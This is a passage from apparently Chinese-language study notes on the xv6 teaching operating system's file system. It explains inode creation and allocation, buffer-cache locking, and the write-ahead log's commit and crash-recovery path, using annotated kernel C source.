element，有一个entry匹配到了，说明找到了，目录的data就是entry</span><br>      <span class="hljs-keyword">if</span>(poff)<br>        *poff = off;<br>      inum = de.inum;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">iget</span>(dp-&gt;dev, inum);<br>    &#125;   <br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span>*<br><span class="hljs-built_in">create</span>(<span class="hljs-type">char</span> *path, <span class="hljs-type">short</span> type, <span class="hljs-type">short</span> major, <span class="hljs-type">short</span> minor)<br>&#123;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> *ip, *dp;<br>  <span class="hljs-type">char</span> name[DIRSIZ];<br><br>  <span class="hljs-keyword">if</span>((dp = <span class="hljs-built_in">nameiparent</span>(path, name)) == <span class="hljs-number">0</span>)<br>    <span class="hljs-comment">// 查找父级目录，这里说明没找到，返回父级目录的inode</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">ilock</span>(dp); <span class="hljs-comment">// 加锁，其他进程无法访问父级目录的inode，如果不加锁，其他进程操作该文件，可能会引起异常</span><br><br>  <span class="hljs-keyword">if</span>((ip = <span class="hljs-built_in">dirlookup</span>(dp, name, <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>)&#123; <br>    <span class="hljs-comment">// 在父级目录里查找该文件，如果文件存在，返回找到的indoe</span><br>    <span class="hljs-built_in">iunlockput</span>(dp); <span class="hljs-comment">// 释放锁</span><br>    <span class="hljs-built_in">ilock</span>(ip); <span class="hljs-comment">// 加锁，其他进程无法访问目标文件inode</span><br>    <span class="hljs-keyword">if</span>(type == T_FILE &amp;&amp; (ip-&gt;type == T_FILE || ip-&gt;type == T_DEVICE))<br>      <span class="hljs-keyword">return</span> ip; <br>    <span class="hljs-built_in">iunlockput</span>(ip); <span class="hljs-comment">// 释放锁</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>((ip = <span class="hljs-built_in">ialloc</span>(dp-&gt;dev, type)) == <span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;create: ialloc&quot;</span>);<br><br>  <span class="hljs-built_in">ilock</span>(ip); <span class="hljs-comment">// 加锁，其他进程无法访问目标文件inode</span><br>  ip-&gt;major = major;<br>  ip-&gt;minor = minor;<br>  ip-&gt;nlink = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">iupdate</span>(ip);<br><br>  <span class="hljs-keyword">if</span>(type == T_DIR)&#123;  <span class="hljs-comment">// Create . and .. entries.</span><br>    dp-&gt;nlink++;  <span class="hljs-comment">// for &quot;..&quot;</span><br>    <span class="hljs-built_in">iupdate</span>(dp);<br>    <span class="hljs-comment">// No ip-&gt;nlink++ for &quot;.&quot;: avoid cyclic ref count.</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">dirlink</span>(ip, <span class="hljs-string">&quot;.&quot;</span>, ip-&gt;inum) &lt; <span class="hljs-number">0</span> || <span class="hljs-built_in">dirlink</span>(ip, <span class="hljs-string">&quot;..&quot;</span>, dp-&gt;inum) &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;create dots&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">dirlink</span>(dp, name, ip-&gt;inum) &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;create: dirlink&quot;</span>);<br><br>  <span class="hljs-built_in">iunlockput</span>(dp);<br><br>  <span class="hljs-keyword">return</span> ip; <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ialloc">Ialloc</h4><p>首先调用bread获取缓存inode，如果缓存没有就分配最近未使用的（LRU链表）（这里会加一个睡眠锁，仅允许当前进程使用），找到后返回一个block对应的buf节点，在分配的缓存节点里找适合的位置（合适的位置=inode#/64+start_addr），然后log_write就可以写日志了，在日志里记录当前正在写的block。</p><p>它很简单，但是又不是很高效。它会遍历所有可能的inode编号，找到inode所在的block，再看位于block中的inode数据的type字段。如果这是一个空闲的inode，那么将其type字段设置为文件，这会将inode标记为已被分配。</p><p>以上就是第一次写磁盘涉及到的函数调用。这里有个有趣的问题，如果有多个进程同时调用create函数会发生什么？对于一个多核的计算机，进程可能并行运行，两个进程可能同时会调用到ialloc函数，然后进而调用bread（blockread）函数。所以必须要有一些机制确保这两个进程不会互相影响。</p><blockquote><p>是的，我们这里看一下目标blockno的cache是否存在，如果存在的话，将block对象的引用计数（refcnt）加1，之后再释放bcache锁，因为现在我们已经完成了对于cache的检查并找到了blockcache。之后，代码会尝试获取block cache的锁。</p><p>所以，如果有多个进程同时调用bget的话，<strong>其中一个可以获取bcache的锁并扫描buffercache。此时，其他进程是没有办法修改buffercache的（注，因为bacche的锁被占住了）。</strong>之后，进程会查找blocknumber是否在cache中，如果在的话将blockcache的引用计数加1，表明当前进程对blockcache有引用，之后再释放bcache的锁。如果有第二个进程也想扫描buffercache，那么这时它就可以获取bcache的锁。假设第二个进程也要获取该block的cache，那么它也会对相应的blockcache的引用计数加1。最后这两个进程都会尝试对block 33的blockcache调用acquiresleep函数。</p><p>acquiresleep是另一种锁，我们称之为sleep lock，本质上来说它获取目标block cache的锁。其中一个进程获取锁之后函数返回。</p></blockquote><p>如果buffer cache中有两份block33的cache将会出现问题。假设一个进程要更新inode19，另一个进程要更新inode20。如果它们都在处理block33的cache，并且cache有两份，那么第一个进程可能持有一份cache并先将inode19写回到磁盘中，而另一个进程持有另一份cache会将inode20写回到磁盘中，并将inode19的更新覆盖掉。所以一个block只能在buffercache中出现一次。你们在完成File system lab时，必须要维持buffercache的这个属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">struct buf &#123;<br>  int valid;   <span class="hljs-comment">// has data been read from disk?</span><br>  int disk;    <span class="hljs-comment">// does disk &quot;own&quot; buf?</span><br>  uint dev;<br>  uint blockno;<br>  struct sleeplock lock;<br>  uint refcnt;<br>  struct buf *prev; <span class="hljs-comment">// LRU cache list</span><br>  struct buf *next;<br>  uchar data[<span class="hljs-variable constant_">BSIZE</span>]; <span class="hljs-variable constant_">BSIZE</span> = <span class="hljs-number">1024</span><br>&#125;;<br><br><span class="hljs-comment">// Look through buffer cache for block on device dev.</span><br><span class="hljs-comment">// If not found, allocate a buffer.</span><br><span class="hljs-comment">// In either case, return locked buffer.</span><br><span class="hljs-keyword">static</span> struct buf*<br><span class="hljs-title function_">bget</span>(<span class="hljs-params">uint dev, uint blockno</span>)<br>&#123;<br>  struct buf *b;<br>  <span class="hljs-title function_">acquire</span>(&amp;bcache.<span class="hljs-property">lock</span>);<br><br>  <span class="hljs-comment">// Is the block already cached?</span><br>  <span class="hljs-keyword">for</span>(b = bcache.<span class="hljs-property">head</span>.<span class="hljs-property">next</span>; b != &amp;bcache.<span class="hljs-property">head</span>; b = b-&gt;next)&#123;<br>    <span class="hljs-keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;<br>      b-&gt;refcnt++;<br>      <span class="hljs-title function_">release</span>(&amp;bcache.<span class="hljs-property">lock</span>);<br>      <span class="hljs-title function_">acquiresleep</span>(&amp;b-&gt;lock);<br>      <span class="hljs-keyword">return</span> b;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// Not cached.</span><br>  <span class="hljs-comment">// Recycle the least recently used (LRU) unused buffer.</span><br>  <span class="hljs-keyword">for</span>(b = bcache.<span class="hljs-property">head</span>.<span class="hljs-property">prev</span>; b != &amp;bcache.<span class="hljs-property">head</span>; b = b-&gt;prev)&#123;<br>    <span class="hljs-keyword">if</span>(b-&gt;refcnt == <span class="hljs-number">0</span>) &#123;<br>      b-&gt;dev = dev;<br>      b-&gt;blockno = blockno;<br>      b-&gt;valid = <span class="hljs-number">0</span>;<br>      b-&gt;refcnt = <span class="hljs-number">1</span>;<br>      <span class="hljs-title function_">release</span>(&amp;bcache.<span class="hljs-property">lock</span>);<br>      <span class="hljs-title function_">acquiresleep</span>(&amp;b-&gt;lock);<br>      <span class="hljs-keyword">return</span> b;<br>    &#125;<br>  &#125;<br>  <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;bget: no buffers&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">// 分配inode</span><br>struct inode*<br><span class="hljs-title function_">ialloc</span>(<span class="hljs-params">uint dev, short type</span>)<br>&#123;<br>  int inum;<br>  struct buf *bp;<br>  struct dinode *dip;<br><br>  <span class="hljs-keyword">for</span>(inum = <span class="hljs-number">1</span>; inum &lt; sb.<span class="hljs-property">ninodes</span>; inum++)&#123;<br>    bp = <span class="hljs-title function_">bread</span>(dev, <span class="hljs-title function_">IBLOCK</span>(inum, sb));<br>    dip = (struct dinode*)bp-&gt;data + inum%<span class="hljs-variable constant_">IPB</span>; <br>    <span class="hljs-keyword">if</span>(dip-&gt;type == <span class="hljs-number">0</span>)&#123;  <span class="hljs-comment">// a free inode</span><br>      <span class="hljs-title function_">memset</span>(dip, <span class="hljs-number">0</span>, <span class="hljs-title function_">sizeof</span>(*dip));<br>      dip-&gt;type = type;<br>      <span class="hljs-title function_">log_write</span>(bp);   <span class="hljs-comment">// mark it allocated on the disk</span><br>      <span class="hljs-title function_">brelse</span>(bp); <span class="hljs-comment">// 释放睡眠锁</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">iget</span>(dev, inum);<br>    &#125;   <br>    <span class="hljs-title function_">brelse</span>(bp);<br>  &#125;<br>  <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;ialloc: no inodes&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// Return a locked buf with the contents of the indicated block.</span><br><span class="hljs-comment">// bread每次只能拿到一个block</span><br>struct buf*<br><span class="hljs-title function_">bread</span>(<span class="hljs-params">uint dev, uint blockno</span>)<br>&#123;<br>  struct buf *b; <br><br>  b = <span class="hljs-title function_">bget</span>(dev, blockno); <span class="hljs-comment">// 根据block获取缓存的对应的buf节点</span><br>  <span class="hljs-keyword">if</span>(!b-&gt;valid) &#123; <span class="hljs-comment">// 如果buf上之前没有数据</span><br>    <span class="hljs-title function_">virtio_disk_rw</span>(b, <span class="hljs-number">0</span>); <span class="hljs-comment">// 从disk上获取数据，完成一次真正的读写</span><br>    b-&gt;valid = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> b;<br>&#125;<br><br><br>关于brelese：<br>这个函数会对refcnt减<span class="hljs-number">1</span>，并释放sleep lock。这意味着，如果有任何一个其他进程正在等待使用这个block cache，现在它就能获得这个block cache的sleep lock，并发现刚刚做的改动。<br>假设两个进程都需要分配一个新的inode，且新的inode都位于block <span class="hljs-number">33</span>。如果第一个进程分配到了inode18并完成了更新，那么它对于inode18的更新是可见的。另一个进程就只能分配到inode19，因为inode18已经被标记为已使用，任何之后的进程都可以看到第一个进程对它的更新。<br>这正是我们想看到的结果，如果一个进程创建了一个inode或者创建了一个文件，之后的进程执行读就应该看到那个文件<br></code></pre></td></tr></table></figure><h4 id="log_write">log_write</h4><p>log_write主要是在log缓存里记录了当前正在写的block（所以一次commit仅一个block，也仅一个文件）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 记录本次操作的日志</span><br><span class="hljs-title function_">log_write</span>(<span class="hljs-params">struct buf *b</span>)<br>&#123;<br>  int i;<br><br>  <span class="hljs-title function_">acquire</span>(&amp;log.<span class="hljs-property">lock</span>); <span class="hljs-comment">// 操作日志需要加锁</span><br>  <span class="hljs-keyword">if</span> (log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span> &gt;= <span class="hljs-variable constant_">LOGSIZE</span> || log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span> &gt;= log.<span class="hljs-property">size</span> - <span class="hljs-number">1</span>)<br>      <span class="hljs-comment">// 日志的数量最大30，或者大于本身该日志所能承受的大小</span><br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;too big a transaction&quot;</span>);<br>  <span class="hljs-keyword">if</span> (log.<span class="hljs-property">outstanding</span> &lt; <span class="hljs-number">1</span>) <br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;log_write outside of trans&quot;</span>);<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>; i++) &#123;<br>    <span class="hljs-comment">// 寻找目标block</span><br>    <span class="hljs-keyword">if</span> (log.<span class="hljs-property">lh</span>.<span class="hljs-property">block</span>[i] == b-&gt;blockno)   <span class="hljs-comment">// log absorption</span><br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  在header的数组里记录block#<br>  log.<span class="hljs-property">lh</span>.<span class="hljs-property">block</span>[i] = b-&gt;blockno;<br>  <span class="hljs-keyword">if</span> (i == log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>) &#123;  <span class="hljs-comment">// 如果是新增的日志，则n++</span><br>    <span class="hljs-title function_">bpin</span>(b);<br>    log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>++;<br>  &#125;<br>  <span class="hljs-title function_">release</span>(&amp;log.<span class="hljs-property">lock</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="commit">commit</h4><p>最后回到create函数，调用end_op，进而调用commit，commit会连续调用不同的函数，分别是用header 缓存更新log缓存，接着用更新后的log缓存做真正的提交；用log缓存更新header 缓存；清空log</p><ul><li>write_log：基本上就是将所有存在于内存中的logheader中的block编号对应的block写入到磁盘上的log区域中（注，也就是将变化先从内存拷贝到log中）。函数中依次遍历log中记录的block，并写入到log中。它首先读出logblock，将cache中的block拷贝到log block，最后再将logblock写回到磁盘中。这样可以确保需要写入的block都记录在log中。但是在这个位置，我们还没有commit，现在我们只是将block存放在了log中。如果我们在这个位置也就是在write_head之前crash了，<strong>那么最终的表现就像是transaction从来没有发生过，文件不会有任何变化同步到disk上。</strong></li><li>write_head：会将内存中的log header写入到磁盘的logheader中。首先读取log的headerblock。将n拷贝到block中，将所有的block编号拷贝到header的列表中。最后再将headerblock写回到磁盘。函数中的倒数第2行，bwrite是实际的commitpoint吗？如果crash发生在这个bwrite之前，会发生什么？<strong>这时虽然我们写了log的headerblock，但是数据并没有落盘。所以crash并重启恢复时，并不会发生任何事情。</strong>那crash发生在bwrite之后会发生什么呢？<strong>这时header会写入到磁盘中，当重启恢复相应的文件系统操作会被恢复。在恢复过程的某个时间点，恢复程序可以读到logheader并发现比如说有5个log还没有install，恢复程序可以将这5个log拷贝到实际的位置。所以这里的bwrite就是实际的commitpoint。在commit point之前，transaction并没有发生，在commitpoint之后，只要恢复程序正确运行，transaction必然可以完成。</strong></li><li>install_trans：这里先读取logblock，再读取文件系统对应的block。将数据从log拷贝到文件系统，最后将文件系统block缓存落盘。这里实际上就是将block数据从log中拷贝到了实际的文件系统block中。当然，可能在这里代码的某个位置会出现问题，但是这应该也没问题，因为在恢复的时候，我们会从最开始重新执行过。</li><li>最后write_log：会将log header中的n设置为0，再将logheader写回到磁盘中。将n设置为0的效果就是清除log，晴空磁盘额的log。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">void</span><br><span class="hljs-title function_">end_op</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  int do_commit = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// 枷锁</span><br>  <span class="hljs-title function_">acquire</span>(&amp;log.<span class="hljs-property">lock</span>); <br>  log.<span class="hljs-property">outstanding</span> -= <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span>(log.<span class="hljs-property">committing</span>)<br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;log.committing&quot;</span>);<br>  <span class="hljs-keyword">if</span>(log.<span class="hljs-property">outstanding</span> == <span class="hljs-number">0</span>)&#123;<br>    do_commit = <span class="hljs-number">1</span>;<br>    log.<span class="hljs-property">committing</span> = <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// begin_op() may be waiting for log space,</span><br>    <span class="hljs-comment">// and decrementing log.outstanding has decreased</span><br>    <span class="hljs-comment">// the amount of reserved space.</span><br>    <span class="hljs-title function_">wakeup</span>(&amp;log);<br>  &#125;<br>  <span class="hljs-title function_">release</span>(&amp;log.<span class="hljs-property">lock</span>);<br><br>  <span class="hljs-keyword">if</span>(do_commit)&#123;<br>    <span class="hljs-comment">// call commit w/o holding locks, since not allowed</span><br>    <span class="hljs-comment">// to sleep with locks.</span><br>    <span class="hljs-title function_">commit</span>();<br>    <span class="hljs-title function_">acquire</span>(&amp;log.<span class="hljs-property">lock</span>);<br>    log.<span class="hljs-property">committing</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-title function_">wakeup</span>(&amp;log);<br>    <span class="hljs-title function_">release</span>(&amp;log.<span class="hljs-property">lock</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br><span class="hljs-title function_">write_log</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  int tail;<br><br>  <span class="hljs-keyword">for</span> (tail = <span class="hljs-number">0</span>; tail &lt; log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>; tail++) &#123;<br>    struct buf *to = <span class="hljs-title function_">bread</span>(log.<span class="hljs-property">dev</span>, log.<span class="hljs-property">start</span>+tail+<span class="hljs-number">1</span>); <span class="hljs-comment">// log block</span><br>    struct buf *<span class="hljs-keyword">from</span> = <span class="hljs-title function_">bread</span>(log.<span class="hljs-property">dev</span>, log.<span class="hljs-property">lh</span>.<span class="hljs-property">block</span>[tail]); <span class="hljs-comment">// cache block</span><br>    <span class="hljs-title function_">memmove</span>(to-&gt;data, <span class="hljs-keyword">from</span>-&gt;data, <span class="hljs-variable constant_">BSIZE</span>);<br>    <span class="hljs-title function_">bwrite</span>(to);  <span class="hljs-comment">// write the log to disk</span><br>    <span class="hljs-title function_">brelse</span>(<span class="hljs-keyword">from</span>);<br>    <span class="hljs-title function_">brelse</span>(to);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br><span class="hljs-title function_">commit</span>(<span class="hljs-params"></span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span> &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-title function_">write_log</span>();     <span class="hljs-comment">// 用 header 缓存更新log缓存</span><br>    <span class="hljs-title function_">write_head</span>();    <span class="hljs-comment">// 用更新后的log缓存 -- the real commit</span><br>    <span class="hljs-title function_">install_trans</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 用log缓存更新 header 缓存</span><br>    log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-title function_">write_head</span>();    <span class="hljs-comment">// Erase the transaction from the log</span><br>  &#125;<br>&#125;<br><br><br><span class="hljs-comment">// file.h</span><br>struct inode &#123;<br>  uint dev;           <span class="hljs-comment">// Device number</span><br>  uint inum;          <span class="hljs-comment">// Inode number</span><br>  int ref;            <span class="hljs-comment">// Reference count</span><br>  struct sleeplock lock; <span class="hljs-comment">// protects everything below here</span><br>  int valid;          <span class="hljs-comment">// inode has been read from disk?</span><br><br>  short type;         <span class="hljs-comment">// copy of disk inode</span><br>  short major;<br>  short minor;<br>  short nlink;<br>  uint size;<br>  uint addrs[<span class="hljs-variable constant_">NDIRECT</span>+<span class="hljs-number">1</span>];<br>&#125;;<br>    <br><span class="hljs-comment">// Contents of the header block, used for both the on-disk header block</span><br><span class="hljs-comment">// and to keep track in memory of logged block# before commit.</span><br>struct logheader &#123;<br>  int n; 一般用于判断是否真的需要往disk里写东西<br>  int block[<span class="hljs-variable constant_">LOGSIZE</span>]; <span class="hljs-number">30</span><br>&#125;;<br><br><span class="hljs-variable constant_">BSIZE</span> <span class="hljs-number">1024</span><br><span class="hljs-variable constant_">LOGSIZE</span> <span class="hljs-number">30</span><br><span class="hljs-variable constant_">MAXOPBLOCKS</span> <span class="hljs-number">10</span><br><br>struct log &#123;<br>  struct spinlock lock;<br>  int start;<br>  int size;<br>  int outstanding; <span class="hljs-comment">// how many FS sys calls are executing，可以理解为往disk输送的调用有几个.</span><br>  int committing;  <span class="hljs-comment">// in commit(), please wait.</span><br>  int dev;<br>  struct logheader lh; <br>&#125;;<br>struct log log;<br><br><span class="hljs-comment">// Read the log header from disk into the in-memory log header</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br><span class="hljs-title function_">read_head</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  struct buf *buf = <span class="hljs-title function_">bread</span>(log.<span class="hljs-property">dev</span>, log.<span class="hljs-property">start</span>);<br>  struct logheader *lh = (struct logheader *) (buf-&gt;data);<br>  int i;<br>  log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span> = lh-&gt;n;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>; i++) &#123;<br>    log.<span class="hljs-property">lh</span>.<span class="hljs-property">block</span>[i] = lh-&gt;block[i];<br>  &#125;<br>  <span class="hljs-title function_">brelse</span>(buf);<br>&#125;<br><br><span class="hljs-comment">// Write in-memory log header to disk.</span><br><span class="hljs-comment">// This is the true point at which the</span><br><span class="hljs-comment">// current transaction commits.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br><span class="hljs-title function_">write_head</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  struct buf *buf = <span class="hljs-title function_">bread</span>(log.<span class="hljs-property">dev</span>, log.<span class="hljs-property">start</span>);<br>  struct logheader *hb = (struct logheader *) (buf-&gt;data);<br>  int i;<br>  hb-&gt;n = log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>; i++) &#123;<br>    hb-&gt;block[i] = log.<span class="hljs-property">lh</span>.<span class="hljs-property">block</span>[i];<br>  &#125;<br>  <span class="hljs-title function_">bwrite</span>(buf);<br>  <span class="hljs-title function_">brelse</span>(buf);<br>&#125;<br><br><span class="hljs-comment">// 更新缓存里的header</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br><span class="hljs-title function_">install_trans</span>(<span class="hljs-params">int recovering</span>)<br>&#123;<br>  int tail;<br><br>  <span class="hljs-keyword">for</span> (tail = <span class="hljs-number">0</span>; tail &lt; log.<span class="hljs-property">lh</span>.<span class="hljs-property">n</span>; tail++) &#123;<br>    struct buf *lbuf = <span class="hljs-title function_">bread</span>(log.<span class="hljs-property">dev</span>, log.<span class="hljs-property">start</span>+tail+<span class="hljs-number">1</span>); <span class="hljs-comment">// read log block，这里的log.start+tail+1是log block no</span><br>    struct buf *dbuf = <span class="hljs-title function_">bread</span>(log.<span class="hljs-property">dev</span>, log.<span class="hljs-property">lh</span>.<span class="hljs-property">block</span>[tail]); <span class="hljs-comment">// read dst，因为这里的log.lh.block[tail]就是文件系统数据block no</span><br>    <span class="hljs-title function_">memmove</span>(dbuf-&gt;data, lbuf-&gt;data, <span class="hljs-variable constant_">BSIZE</span>);  <span class="hljs-comment">// copy block to dst</span><br>    <span class="hljs-title function_">bwrite</span>(dbuf);  <span class="hljs-comment">// write dst to disk</span><br>    <span 